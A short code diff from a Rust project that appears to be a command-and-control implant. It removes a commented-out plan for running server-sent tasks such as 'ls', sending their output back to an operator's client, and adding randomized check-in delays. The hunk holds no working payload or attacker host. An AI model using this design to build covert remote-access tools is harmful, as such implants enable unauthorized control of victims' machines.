@@ -120,19 +120,6 @@ pub extern "system" fn Pick() {
     //call our function to send the request
     send_request(imp_info);
 
-    /*fn run_tasks(tasks: ?) -> ? {
-
-        have a match tree for the task name to match up to send it to a function for that specific task,
-        such as 'ls' to list directories and send to ls function here
-        need to decide if we should send back any sort of task status, or just send the output of the task
-        i also need to decide how to send the output of the task all the way back to the server so it can be displayed in the client
-        i think i decided that I'll have a whole other API call here to a new endpoint,
-        and the server will have a route for that endpoint that will take the output and display it in the client
-        i think i'll have to make a new struct for the output, and then serialize it to json, and send it in the body of the request
-        also could potentially have another sleep or delay here that could add some randomness to the checkin times
-
-    } */
-
     fn run_tasks(
         tasks: String,
         server: String,
